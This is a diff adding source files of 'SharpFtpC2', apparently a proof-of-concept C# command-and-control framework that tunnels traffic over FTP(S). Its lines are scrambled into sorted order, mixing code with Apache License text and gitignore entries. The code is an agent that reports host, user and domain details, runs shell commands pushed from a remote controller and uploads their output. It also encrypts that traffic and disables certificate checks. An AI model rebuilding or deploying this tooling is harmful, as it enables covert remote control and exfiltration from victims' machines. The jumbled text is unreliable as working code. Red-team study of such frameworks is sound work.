@@ -1,0 +1,2066 @@
+    
+        
+         
+          
+            
+                
+                   
+                    
+                        
+                               
+                                
+                                 
+                                    
+                                      
+                                        
+                                                
+                                                  
+                                                                       
+                                                ((ResponseNotification)response).Kind = ResponseNotification.NotificationKind.AgentTerminated
+                                                CancellationTokenSource.Cancel()
+                                                break
+                                                response = new ResponseNotification()
+                                            {
+                                            }
+                                        case TaskCommand.CommandKind.TerminateAgent:
+                                    ((ResponseShellCommand)response).RunShellCommand(taskShellCommand.Command 
+                                    break
+                                    if (!DangerousActionConfirmation.Invoke(wrappedTask.TaskType))
+                                    response = new ResponseShellCommand()
+                                    switch(taskCommand.Command)
+                                    task = unwrappedTask
+                                    {
+                                    }
+                                 Apache License
+                                // The DangerousActionConfirmation delegate is intended to be placed at every location where potentially harmful
+                                // code may be executed. The primary purpose is to prevent unintentional execution of malicious actions without
+                                // user consent during the Proof of Concept (PoC) phase.
+                                TaskCommand
+                                TaskShellCommand
+                                break
+                                if (DangerousActionConfirmation != null)
+                                if (unwrappedTask != null)
+                                response = JsonSerializer.Deserialize<ResponseNotification>(jsonData)
+                                response = JsonSerializer.Deserialize<ResponseShellCommand>(jsonData)
+                                {
+                                {                                    
+                                }
+                            // ...
+                            // Add your additional response classes here
+                            // Handle other tasks and response bellow:
+                            ShowResult(value)
+                            c2Protocol.RegisterNewTask(taskRequest)
+                            case TaskCommand taskCommand:
+                            case TaskShellCommand taskShellCommand:
+                            default:
+                            {
+                            }
+                        // ...
+                        // Add your additional task classes here
+                        ///
+                        ActiveAgent = agentId
+                        Console.ForegroundColor = ConsoleColor.Red
+                        Console.ResetColor()
+                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stderr))
+                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stdout))
+                        DeleteFile(file)
+                        ResponseWrapper
+                        TaskRequests.Clear()
+                        continue
+                        else
+                        foreach (TaskWrapper taskRequest in TaskRequests)
+                        http://www.apache.org/licenses/
+                        if (!responses.ContainsKey(packedFileName.Uid.Value))
+                        if (response != null)                        
+                        key = _RSA.ExportRSAPrivateKey()
+                        key = _RSA.ExportRSAPublicKey()
+                        responses.Add(entry.Key)
+                        return 1
+                        switch (task)
+                        tasks.Add(task)
+                        wrappedResponse == null 
+                        wrappedResponse.AgentId != packedFileName.Session
+                        wrappedResponse.TaskId != packedFileName.Uid 
+                        {
+                        }
+                       :
+                    )
+                    //  from the remote server. This preemptive action is necessary to prevent
+                    //  resource consumption.
+                    // Any potential exceptions are intentionally ignored to guarantee the deletion
+                    // Download task content
+                    // Gather C2 Tasks.
+                    // Process Tasks:
+                    // Refresh Agents Informations
+                    // Register New Task Requests
+                    // Synchronize Task Responses
+                    // ensures smooth creation and operation of the new task.
+                    // of the task file. This precautionary measure prevents the persistence of a
+                    // operations.                    
+                    // task request file from the remote server. This prerequisite step 
+                    ///
+                    Agent
+                    Agent agent = agentPair.Value
+                    AgentPrompt()
+                    Console.ForegroundColor = ConsoleColor.Yellow
+                    Console.ResetColor()
+                    ControllerPrompt()
+                    DataRow row = table.NewRow()
+                    DeleteFile(file)
+                    List<TaskWrapper> tasks = agentProto.EnumerateTasks()
+                    ResponseWrapper
+                    TaskResponses.Where(x => responses.Contains(x.Key)).OrderBy(x => x.Value.DateTime)
+                    TaskShellCommand task = new()
+                    TaskWrapper
+                    Thread.Sleep(SynchronizeDelay)
+                    Utilities.CheckIntegerArgument(argument)
+                    agentProto.RegisterOrUpdateAgent()
+                    break
+                    c2Protocol.EnumerateResponses(TaskResponses)
+                    c2Protocol.RefreshAgents(Agents)
+                    catch { }
+                    columnWidths[n] = values[n].Length
+                    continue
+                    else
+                    foreach (TaskWrapper task in tasks)
+                    i
+                    i = j
+                    if (
+                    if (!packedFileName.Session.HasValue)
+                    if (Agents.ContainsKey(agentId))
+                    if (HasPrivateKey())
+                    if (HasPublicKey())
+                    if (agent != null 
+                    if (args.Values.Count == 0)
+                    if (entry.Value.AgentId == ActiveAgent)
+                    if (packedFileName.Session != this.Session)
+                    if (response != null) 
+                    if (responseShellCommand.Stderr
+                    if (responseShellCommand.Stdout
+                    if (task != null)
+                    if (wrappedTask == null 
+                    lastIndex = i 
+                    lock (TaskRequestsLock)
+                    return 0
+                    row[0] = agentPair.Key
+                    row[0] = entry.Key
+                    row[1] = agentPair.Value.DisplayName()
+                    row[1] = entry.Value.GetType().Name
+                    row[2] = agent.Domain
+                    row[2] = entry.Value.DisplayName()
+                    row[3] = Utilities.TimeSince(entry.Value.DateTime)
+                    row[3] = agent.ProcessId
+                    row[4] = agent.Is64BitProcess.ToString()
+                    row[5] = (int)(DateTime.Now - agent.DateTime).TotalSeconds
+                    string jsonData = DownloadString(file)
+                    switch (wrappedResponse.ResponseType)
+                    switch(wrappedTask.TaskType)
+                    table.Rows.Add(row)
+                    try
+                    {
+                    }
+                    }                                       
+                    }                                              
+                )
+                // Dirty method to force messages to process during an IDLE time.
+                ///
+                ActiveAgent = Guid.Empty
+                CancellationTokenSource.Cancel()
+                Console.Clear()
+                Console.ForegroundColor = ConsoleColor.Yellow
+                Console.ResetColor()
+                Console.Write(value.PadRight(columnWidths[index
+                Console.WriteLine()
+                Console.WriteLine(parser.GetHelpText())
+                DataTable table = new()
+                List<Guid> responses = new()
+                PeerEncryptionHelper
+                StartInfo = new ProcessStartInfo
+                Thread.Sleep(50)
+                Thread.Sleep(seconds 
+                UX.DisplayError(e.Message)
+                UX.DisplayTableToConsole(table)
+                binaryWriter.Write(plainTextData)
+                break
+                catch
+                catch (Exception ex)
+                catch (Exception ex) 
+                cmd.OnExecute(() =>
+                columnWidths[i] = columnName.Length
+                else
+                file = reader.ReadLine()
+                i
+                i = j
+                if (ActiveAgent == Guid.Empty)
+                if (Agents.Count == 0)
+                if (argument.HasValue())
+                if (i 
+                if (index == 0)
+                if (packedFileName == null)
+                if (packedFileName.Name != Shared.PlaceHolders.AgentInformation)
+                if (packedFileName.Name != Shared.PlaceHolders.ResponseRequest)
+                if (packedFileName.Name != Shared.PlaceHolders.TaskRequest)
+                if (responses.Count == 0)
+                if (string.IsNullOrEmpty(file))
+                if (values[n].Length > columnWidths[n])
+                int seconds = 1
+                items.Add(file)
+                lastIndex = i 
+                of tunneling Command and Control (C2) communication via FTP(S).
+                process.Kill()
+                return
+                return 0
+                return false
+                this.Session 
+                this.Stderr = Encoding.UTF8.GetBytes(stdErrorTask.Result)
+                this.Stdout = Encoding.UTF8.GetBytes(stdOutputTask.Result)
+                throw new ArgumentNullException(argument.ValueName)
+                throw new ExitProgramExceptions()
+                try
+                using BinaryWriter binaryWriter = new(cryptoStream)
+                var packedFileName = UnpackRemoteFileName(file)
+                {
+                }
+                }                
+                }                    
+                })
+            )
+            ///
+            ActiveAgent = Guid.Empty
+            Agent agent = new()
+            CancellationToken cancellationToken = (CancellationToken)obj
+            CancellationTokenSource.Cancel()
+            ColorBackTicks(message)
+            Console.ForegroundColor = ConsoleColor.Yellow
+            Console.ForegroundColor = color
+            Console.ResetColor()
+            Console.Write('[')
+            Console.Write(column.ColumnName.PadRight(columnWidths[index
+            Console.Write(icon)
+            Console.WriteLine()
+            Console.WriteLine(Encoding.UTF8.GetString(plainTextBuffer))
+            Console.WriteLine(cipherText)
+            Console.WriteLine(message.Substring(lastIndex))
+            Convert.FromBase64String(privateKey)
+            DataRow row = table.Rows[i]
+            FtpWebRequest request = this.NewRequest(remoteDirectoryPath)
+            List<TaskWrapper> tasks = new()
+            List<string> files = ListDirectory()
+            PeerEncryptionHelper
+            SelfEncryptionHelper
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true
+            Signature = encryptionHelper
+            Task<string> stdErrorTask = process.StandardError.ReadToEndAsync()
+            Task<string> stdOutputTask = process.StandardOutput.ReadToEndAsync()
+            TaskRequests.Add(taskRequest)
+            Thread.Sleep(1000)
+            _RSA
+            agent.Refresh(this.Session)
+            agentProto.DangerousActionConfirmation 
+            agentProto.SetupPeerEncryptionHelper(EncodedPeerPublicKey)
+            byte[] hash = md5.ComputeHash(key)
+            byte[] plainTextBuffer = encryptionHelper.DecryptFromJson(cipherText)
+            c2Protocol.SetupPeerEncryptionHelper(EncodedPeerPublicKey)
+            cancelEventArgs.Cancel = true
+            case KeyKind.privateKey:
+            case KeyKind.publicKey:
+            case ResponseShellCommand responseShellCommand:
+            catch (Exception e)
+            catch (ExitProgramExceptions)
+            cmd.OnExecute(() =>
+            content = Encoding.UTF8.GetString(SelfEncryptionHelper.DecryptFromJson(content))
+            content = PeerEncryptionHelper.EncryptToJson(content)
+            daemon.Join()
+            daemon.Start(CancellationTokenSource.Token)
+            default:
+            else
+            else if (timeSpan.TotalDays < 30)
+            else if (timeSpan.TotalDays < 365)
+            else if (timeSpan.TotalHours < 24)
+            else if (timeSpan.TotalMinutes < 60)
+            encryptedBundle.Data == null 
+            encryptedBundle.Key == null 
+            encryptedBundle.Nonce == null 
+            encryptedBundle.Tag
+            encryptedBundle.Tag == null
+            encryptionHelper.AESCallback 
+            for (int i = 0
+            for (int n = 0
+            foreach (string file in files)
+            foreach (string value in values)
+            formatedByteString 
+            if (Id == null) 
+            if (answer == null)
+            if (argument.Value() == null)
+            if (columnName.Length > columnWidths[i])
+            if (i 
+            if (index == 0)
+            if (obj == null)
+            if (plainText == null 
+            if (process.WaitForExit(60 
+            if (timeSpan.TotalSeconds < 60)
+            index = 0
+            int lastIndex = 0
+            process.Start()
+            request.Method = WebRequestMethods.Ftp.ListDirectory
+            response.AgentId = this.Session 
+            response.DateTime = DateTime.Now
+            response.ResponseType = response.GetType().Name
+            response.TaskId = taskId
+            return
+            return Array.Empty<byte>()
+            return JsonSerializer.Deserialize<PackedFileName>(serializedClass)
+            return Kind.ToString()
+            return false
+            return matches.Cast<Match>().Select(m => m.Value.Trim()).ToArray()
+            return new Guid(hash)
+            return null
+            return tasks
+            return this.Command 
+            return true
+            string
+            string cipherText = encryptionHelper.EncryptToJson(plainText)
+            string columnName = table.Columns[i].ColumnName
+            string jsonAgent = JsonSerializer.Serialize(agent)
+            string remoteFileName = PackRemoteFileName(
+            string serializedClass = Encoding.UTF8.GetString(Convert.FromBase64String(remoteFileName))
+            string upperAnswer = answer.ToUpper()
+            string[] values = row.ItemArray.Cast<string>().ToArray()
+            this.Command = commandLine
+            this.Computer = Environment.MachineName
+            this.DateTime = DateTime.Now
+            this.Domain = Environment.UserDomainName
+            this.Id = Id.Value
+            this.ImagePath = Process.GetCurrentProcess()
+            this.Is64BitProcess = Environment.Is64BitProcess
+            this.OSVersion = Environment.OSVersion.VersionString
+            this.ProcessId = Process.GetCurrentProcess().Id
+            this.Session = session
+            this.User = Environment.UserName
+            this.WorkDir = Path.GetFileName(Path.GetDirectoryName(this.WorkPath))
+            this.WorkPath = Environment.CurrentDirectory
+            try
+            using FtpWebResponse response = (FtpWebResponse)request.GetResponse()
+            using MD5 md5 = MD5.Create()
+            using Process process = new()
+            using StreamReader reader = new(response.GetResponseStream())
+            var timeSpan = DateTime.Now.Subtract(dateTime)
+            while (!cancellationToken.IsCancellationRequested)
+            while (true)
+            {
+            {               
+            {                
+            }
+            }           
+            })
+          Derivative Works a copy of this License
+          as modifying the License.
+          as part of the Derivative Works
+          do not modify the License. You may add Your own attribution
+          excluding those notices that do not pertain to any part of
+          include a readable copy of the attribution notices contained
+          of the NOTICE file are for informational purposes only and
+          of the following places: within a NOTICE text file distributed
+          stating that You changed the files
+          that such additional attribution notices cannot be construed
+          the Derivative Works
+          wherever such third-party notices normally appear. The contents
+        !string.IsNullOrEmpty(encodedPrivateKey) 
+        !string.IsNullOrEmpty(encodedPublicKey) 
+        )
+        /
+        // (which are registered by the controller) as well as the processing and response
+        // Body
+        // Body            
+        // Borders between columns
+        // Display Content
+        // Encrypt the AES Key with RSA Public Key.
+        // Extra padding of two chars for each columns 
+        // Generate a one-time secure random AES Key.
+        // Generate a one-time secure random nonce (usually 12 byte / 96 bits)
+        // Generate a random AES key using a cryptographic number generator.
+        // Header
+        // Header                       
+        // Important Notice: The delegate below renders the current application susceptible to
+        // It is crucial for this thread to maintain high availability in order to continuously
+        // Keep process running until CTRL
+        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
+        // More clean
+        // Output Public and Private Keys Fingerprint
+        // Output Public and Private Keys as Base64
+        // Prepare Padding Information
+        // Recover the one-time AES Encryption key using our RSA Private key.
+        // Start daemons
+        // Sum of column widths 
+        // Test encryption with generated keys
+        // The action to handle a CTRL
+        // This configuration was implemented to accommodate self-signed certificates.
+        // This thread is specifically allocated for the enumeration of agent tasks
+        // This thread is tasked with periodically gathering information about active and inactive agents.        
+        // Wait for daemons to join main thread
+        // cryptographic risks.
+        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm
+        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.decrypt
+        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.encrypt
+        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator
+        // if SSL/TLS security is expected.
+        // minimizing resource consumption and ensuring consistent communication with the C2.
+        // of these tasks. This ensures a focused and efficient handling of agent-related
+        // shut down their associated daemons.
+        // signal to the Command and Control (C2) that our agent is operational.
+        // tasks.
+        ///
+        AESCallback
+        AppDomain.CurrentDomain.ProcessExit 
+        CancellationToken token = CancellationTokenSource.Token
+        ColorBackTicks(message)
+        CommandLineApplication parser = new()
+        Console.CancelKeyPress 
+        Console.ForegroundColor = ConsoleColor.Cyan
+        Console.ForegroundColor = ConsoleColor.Green
+        Console.ForegroundColor = color
+        Console.ResetColor()
+        Console.Write('[')
+        Console.Write(agent.Computer)
+        Console.Write(agent.WorkDir)
+        Console.Write(icon)
+        Console.Write(title)
+        Console.Write(value)
+        Console.WriteLine()
+        Console.WriteLine(Convert.ToBase64String(privateKey))
+        Console.WriteLine(Convert.ToBase64String(publicKey))
+        Console.WriteLine(line)
+        Console.WriteLine(message.Substring(lastIndex))
+        Dispose(true)
+        EncryptedBundle
+        EncryptedBundle encryptedBundle = new()
+        FtpWebRequest request = this.NewRequest(destFilePath)
+        FtpWebRequest request = this.NewRequest(remoteDirectoryPath)
+        FtpWebRequest request = this.NewRequest(remoteFilePath)
+        FtpWebResponse response = (FtpWebResponse)request.GetResponse()
+        GC.SuppressFinalize(this)
+        Guid
+        List<Thread> daemons = new()
+        List<string> items = new()
+        PackedFileName packedFilename = new()
+        PeerEncryptionHelper
+        RSAParameters parameters = _RSA.ExportParameters(false)
+        RSAParameters parameters = _RSA.ExportParameters(true)
+        SelfEncryptionHelper
+        SelfEncryptionHelper = new(
+        Stream stream = response.GetResponseStream()
+        TaskCommand taskCommand = new()
+        UX.DisplayAgentPrompt(agent)
+        UX.DisplayBanner()
+        UX.DisplayControllerPrompt()
+        _RSA = RSA.Create()
+        _disposed = true
+        aes.IV = IV
+        aes.Key = aesKey
+        aes.KeySize = 256
+        aes.Mode = CipherMode.CBC
+        byte[]
+        byte[] Tag
+        byte[] aesKey = aes.Key
+        byte[] aesKey = new byte[32]
+        byte[] aesKey = this.RSADecrypt(cipherAesKey)
+        byte[] bytes = Encoding.UTF8.GetBytes(content)
+        byte[] cipherAesKey = this.RSAEncrypt(aesKey)
+        byte[] cipherText = new byte[plainText.Length]
+        byte[] hash = sha1.ComputeHash(data)
+        byte[] nonce = new byte[AesGcm.NonceByteSizes.MaxSize]
+        byte[] plainText = new byte[cipherText.Length]
+        byte[] privateKey = rsa.ExportRSAPrivateKey()
+        byte[] publicKey = rsa.ExportRSAPublicKey()
+        byte[] tag = new byte[AesGcm.TagByteSizes.MaxSize]
+        catch
+        content = EgressDataModifier != null 
+        content = IngressDataModifier != null 
+        daemons.Add(new Thread((object
+        data.CopyTo(requestStream)
+        drawLine()
+        else
+        for (int i = 0
+        foreach (DataColumn column in table.Columns)
+        foreach (DataRow row in table.Rows)
+        foreach (Thread daemon in daemons)
+        foreach (string action in Utilities.SplitEx(actions))
+        if (!HasPrivateKey())
+        if (!HasPublicKey())
+        if (!packedFileName.Signature.HasValue)
+        if (ActiveAgent == Guid.Empty)
+        if (FtpSecure)
+        if (PeerEncryptionHelper != null)
+        if (SelfEncryptionHelper != null) 
+        if (_disposed)
+        if (agent == null)
+        if (disposing)
+        if (encryptedBundle == null 
+        if (key == null)
+        if (maxLength.HasValue)
+        if (packedFileName.Version != ProtocolVersion)
+        if (privateKey != null)
+        if (publicKey != null)
+        if (publicKey == null 
+        if (string.IsNullOrEmpty(action))
+        if (string.IsNullOrEmpty(actions))
+        if (table.Rows.Count == 0)
+        int headerLength = columnWidths.Sum() 
+        int index = 0
+        int lastIndex = 0
+        int[] columnWidths = new int[table.Columns.Count]
+        lock (TaskRequestsLock)
+        lock (_MainThreadLock)
+        plainStream.CopyTo(stream)
+        public CommandKind Command { get
+        public DangerousActionConfirmationDelegate
+        public DateTime DateTime { get
+        public Guid
+        public Guid AgentId { get
+        public Guid Id { get
+        public Guid TaskId { get
+        public List<TaskWrapper> EnumerateTasks()
+        public NotificationKind Kind { get
+        public bool Is64BitProcess { get
+        public byte[]
+        public delegate bool DangerousActionConfirmationDelegate(string nature)
+        public enum CommandKind
+        public enum NotificationKind
+        public int ProcessId { get
+        public override string DisplayName()
+        public static string TimeSince(DateTime dateTime)
+        public static void CheckIntegerArgument(CommandOption argument)
+        public static void ColorBackTicks(string message)
+        public static void DisplayError(string message)
+        public static void DisplayInfo(string message)
+        public static void DisplaySuccess(string message)
+        public static void DisplayWarning(string message)
+        public string
+        public string DisplayName()
+        public void EnumerateResponses(ConcurrentDictionary<Guid /
+        public void Refresh(Guid
+        public void RefreshAgents(ConcurrentDictionary<Guid /
+        public void RegisterNewTask(TaskWrapper task)
+        public void RegisterOrUpdateAgent()
+        public void RunShellCommand(string commandLine)
+        randomGenerator.GetBytes(aesKey)
+        randomGenerator.GetBytes(nonce)
+        request.EnableSsl = this.Secure
+        request.KeepAlive = true
+        request.Method = WebRequestMethods.Ftp.DownloadFile
+        request.Method = WebRequestMethods.Ftp.UploadFile
+        request.Method = command
+        request.UseBinary = true
+        request.UsePassive = true
+        return /
+        return Convert.ToBase64String(Encoding.UTF8.GetBytes(jsonData))
+        return FormatByteArrayAsString(hash)
+        return GetFingerprint(KeyKind.privateKey)
+        return GetFingerprint(KeyKind.publicKey)
+        return JsonSerializer.Serialize(encryptedBundle)
+        return content
+        return formatedByteString
+        return items
+        return parameters.D != null
+        return parameters.Modulus != null 
+        return plainText
+        return reader.ReadToEnd()
+        return request
+        return stream
+        return stream.ToArray()
+        return this.Decrypt(
+        return this.EncryptToJson(Encoding.UTF8.GetBytes(plainTextData))
+        return this.FTP.ListDirectory(remoteDirectoryPath)
+        stream.CopyTo(fileStream)
+        string
+        string content = this.FTP.DownloadString(remoteFilePath)
+        switch (response)
+        switch(keyKind)
+        taskCommand.Command = command
+        taskRequest.AgentId = agentId
+        taskRequest.Id = Guid.NewGuid()
+        taskRequest.TaskType = taskRequest.GetType().Name
+        this.FTP.CreateDirectory(remoteDirectoryPath)
+        this.FTP.DeleteFile(remoteDirectoryPath)
+        this.Host = host
+        this.Password = password
+        this.Secure = secure
+        this.Username = username
+        try
+        using (MemoryStream cipherStream = new())
+        using Aes aes = Aes.Create()
+        using AesGcm aes = new(aesKey)
+        using FtpWebResponse resp = (FtpWebResponse)request.GetResponse()
+        using MemoryStream cipherStream = new(cipherText)
+        using MemoryStream stream = new()
+        using MemoryStream stream = new(bytes)
+        using RSACryptoServiceProvider rsa = new(keyLength)
+        using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create()
+        using SHA1 sha1 = SHA1.Create()
+        using Stream requestStream = request.GetRequestStream()
+        using Stream stream = DownloadData(remoteFilePath)
+        using StreamReader reader = new(stream)
+        var candidates = maxLength.HasValue 
+        while (!token.IsCancellationRequested)
+        while (true)
+        {
+        { 
+        { }
+        }
+        }      
+        })
+        }))
+       http://www.apache.org/licenses/LICENSE-2.0
+      (a) You must give any other recipients of the Work or
+      (an example is provided in the Appendix below).
+      (b) You must cause any modified files to carry prominent notices
+      Contribution(s) alone or by combination of their Contribution(s)
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      Work and such Derivative Works in Source or Object form.
+      You may add Your own copyright statement to Your modifications and
+      and conversions to other media types.
+      and distribution as defined by Sections 1 through 9 of this document.
+      any Contribution intentionally submitted for inclusion in the Work
+      appropriateness of using or redistributing the Work and assume any
+      as of the date such litigation is filed.
+      by You to the Licensor shall be under the terms and conditions of
+      by such Contributor that are necessarily infringed by their
+      comment syntax for the file format. We also recommend that a
+      copyright notice that is included in or attached to the work
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      except as required for reasonable and customary use in describing the
+      excluding communication that is conspicuously marked or otherwise
+      exercising permissions granted by this License.
+      file or class name and description of purpose be included on the
+      granted to You under this License for that Work shall terminate
+      has been advised of the possibility of such damages.
+      identification within third-party archives.
+      institute patent litigation against any entity (including a
+      may provide additional or different license terms and conditions
+      meet the following conditions:
+      of your accepting any such warranty or additional liability.
+      on behalf of whom a Contribution has been received by Licensor and
+      or a Contribution incorporated within the Work constitutes direct
+      or by an individual or Legal Entity authorized to submit on behalf of
+      or other liability obligations and/or rights consistent with this
+      origin of the Work and reproducing the content of the NOTICE file.
+      replaced with your own identifying information. (Don't include
+      result of this License or out of the use or inability to use the
+      risks associated with Your exercise of permissions under this License.
+      submitted to Licensor for inclusion in the Work by the copyright owner
+      subsequently incorporated within the Work.
+      the Work and Derivative Works thereof.
+      the brackets!)  The text should be enclosed in the appropriate
+      the conditions stated in this License.
+      the copyright owner that is granting the License.
+      the original version of the Work and any modifications or additions
+      the terms of any separate license agreement you may have executed
+      unless required by applicable law (such as deliberate and grossly
+      where such license applies only to those patent claims licensable
+      with Licensor regarding such Contributions.
+      with the Work to which such Contribution(s) was submitted. If You
+    )
+    //
+    // ConcurrentBag is not suitable in my scenario so I'm using a classic List with locking mechanisms
+    // EDIT HERE BEGIN 
+    // EDIT HERE END 
+    // For debug purpose
+    // TODO write as an extension of DataTable
+    // data that is sent to the C2's destination.
+    // data that is sent to the agent's destination.
+    // from the C2. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
+    // from the agent. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
+    // please consider updating the following variable to the new protocol version. If the agent's
+    // with a custom logic tailored to your needs.
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    JG
+    internal class AgentProtocol : ProtocolBase
+    internal class C2Protocol : ProtocolBase 
+    internal class ExitProgramExceptions : Exception { }
+    internal class HttpError404 : Exception
+    internal class HttpError405 : Exception
+    internal class ResponseNotification : ResponseWrapper
+    internal class TaskCommand : TaskWrapper
+    internal class UX
+    internal class Utilities
+    private FtpWebRequest NewRequest(string
+    private bool Secure
+    private bool _disposed = false
+    private byte[] RSADecrypt(byte[] encryptedData)
+    private byte[] RSAEncrypt(byte[] plainTextData)
+    private readonly FtpHelper FTP
+    private readonly RSA _RSA
+    private static ConcurrentDictionary<Guid /
+    private static Guid ActiveAgent = Guid.Empty
+    private static List<TaskWrapper> TaskRequests = new()
+    private static object TaskRequestsLock = new()
+    private static void AgentPrompt()
+    private static void ControllerPrompt()
+    private string Password
+    protected AsymEncryptionHelper
+    protected PackedFileName
+    protected class EncryptedBundle
+    protected class PackedFileName
+    protected virtual void Dispose(bool disposing)
+    public AsymEncryptionHelper(byte[]
+    public AsymEncryptionHelper(string
+    public DataModifierDelegate
+    public Guid
+    public Stream DownloadData(string remoteFilePath)
+    public bool HasPrivateKey()
+    public bool HasPublicKey()
+    public byte[] DecryptFromJson(string jsonText)
+    public class Agent
+    public class ResponseShellCommand : ResponseWrapper
+    public class ResponseWrapper
+    public class TaskShellCommand : TaskWrapper
+    public class TaskWrapper
+    public delegate string DataModifierDelegate(string data)
+    public delegate void AESCallbackDelegate(
+    public enum KeyKind
+    public event AESCallbackDelegate
+    public static CancellationTokenSource CancellationTokenSource = new()
+    public static bool OnDangerousActionConfirmation(string nature)
+    public static class PlaceHolders
+    public static readonly Guid AgentSession = Guid.NewGuid()
+    public static readonly bool FtpSecure = false
+    public static readonly int BeaconDelayMax = 1000
+    public static readonly int BeaconDelayMin = 500
+    public static readonly int SynchronizeDelay = 1000
+    public static readonly object _MainThreadLock = new()
+    public static string ComputeFingerprint(byte[] data)
+    public static void ColorBackTicks(string message)
+    public static void DisplayAgentPrompt(Agent
+    public static void DisplayBanner()
+    public static void DisplayControllerPrompt()
+    public static void DisplayError(string message)
+    public static void DisplayInfo(string message)
+    public static void DisplaySuccess(string message)
+    public static void DisplayTableToConsole(DataTable table)
+    public static void DisplayWarning(string message)
+    public static void Main(string[] args)
+    public static void OnProcessExit(object
+    public static void ShowResult(ResponseWrapper response)
+    public static void WriteLabel(string label)
+    public static void WriteTitle(string title)
+    public string DownloadString(string remoteFilePath)
+    public string EncryptToJson(byte[] plainTextData)
+    public string EncryptToJson(string plainTextData)
+    public string Host
+    public string Username
+    public void CreateDirectory(string remoteDirectoryPath)
+    public void DeleteFile(string remoteDirectoryPath)
+    public void Dispose()
+    public void SetupPeerEncryptionHelper(string publicKey)
+    {
+    {       
+    {        
+    { }    
+    }
+    }   
+    }    
+   1. Definitions.
+   2. Grant of Copyright License. Subject to the terms and conditions of
+   3. Grant of Patent License. Subject to the terms and conditions of
+   4. Redistribution. You may reproduce and distribute copies of the
+   6. Trademarks. This License does not grant permission to use the trade
+   7. Disclaimer of Warranty. Unless required by applicable law or
+   9. Accepting Warranty or Additional Liability. While redistributing
+   APPENDIX: How to apply the Apache License to your work.
+   Copyright [yyyy] [name of copyright owner]
+   END OF TERMS AND CONDITIONS
+   See the License for the specific language governing permissions and
+   You may obtain a copy of the License at
+   limitations under the License.
+   you may not use this file except in compliance with the License.
+  7@:            !J  5
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+ !YYJJP
+ !signature.HasValue 
+ !tools/packages.config
+ (columnWidths.Length 
+ (columnWidths.Length - 1)
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ .NET Core
+ // 
+ // Cancel default behaviour
+ // Ignore
+ // Ignore          
+ // Ignore                       
+ // Signal tokens that application needs to be closed.
+ 1 < message.Length 
+ 1))
+ 10)) // 10 min threshold
+ 1000 
+ 1000)
+ 1] != '
+ 2) 
+ 8 = 256 bits        
+ =========================================================================================
+ AES)
+ AESCallback
+ ASP.NET Scaffolding
+ Agent 
+ AgentId 
+ Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ C2 Encryption (RSA 
+ Cake - Uncomment if you are using it
+ Changelog
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ Command { get
+ Computer { get
+ Convert.FromBase64String(encodedPrivateKey) : null
+ Create Directory
+ DangerousActionConfirmation
+ Data { get
+ Delete File
+ Description:   SharpFtpShell is a compact C
+ Disclaimer
+ DocProject is a documentation generator add-in
+ Domain { get
+ Donnie Darko 
+ DotCover is a Code Coverage Tool
+ EgressDataModifier
+ EgressDataModifier.Invoke(content) : content
+ Email:         jplesueur@phrozen.io
+ Enumerate Directory Files
+ FAKE - F
+ File Upload
+ Files built by Visual Studio
+ Files/
+ Fody - auto-generated XML schema
+ Get latest from https://github.com/github/gitignore/blob/main/VisualStudio.gitignore
+ GetFingerprint(KeyKind keyKind)
+ GetPrivateKeyFingerprint()
+ GetPublicKeyFingerprint()
+ GhostDoc plugin setting file
+ GitHub:        https://github.com/DarkCoderSc
+ Give a Try
+ Guid.Empty
+ Guidance Automation Toolkit
+ Id)
+ ImagePath { get
+ Including strong name files can present a security risk
+ IngressDataModifier
+ IngressDataModifier.Invoke(content) : content
+ Installshield output folder
+ Ionide (cross platform F
+ JetBrains Rider
+ June 09 2023 - v1.0b
+ June 16 2023 - v1.0
+ June 21 2023 - v2.0
+ June 23 2023 - v3.0 Final
+ Key { get
+ License:       Apache-2.0
+ Local History for Visual Studio
+ Local History for Visual Studio Code
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Name { get
+ Node.js Tools for Visual Studio
+ Nonce { get
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OSVersion { get
+ OpenCover UI analysis results
+ Others
+ Paket dependency manager
+ PeerEncryptionHelper
+ Project:       SharpFtpC2 - Agent (v1.0 Beta)
+ Project:       SharpFtpC2 - C2 (v1.0 Beta)
+ Project:       SharpFtpC2 - RSA Key Helper (v1.0)
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ ResponseType { get
+ Run a shell command and echo response.
+ SQL Server files
+ Screenshots
+ SelfEncryptionHelper
+ Session { get
+ Session { set
+ SharpFtpC2 (PoC)
+ Signature { get
+ Stderr { get
+ Stdout { get
+ Stream Upload (Generic)
+ String Upload
+ StyleCop
+ Supported Commands
+ TFS 2012 Local Workspace
+ Tabs Studio
+ Tag { get
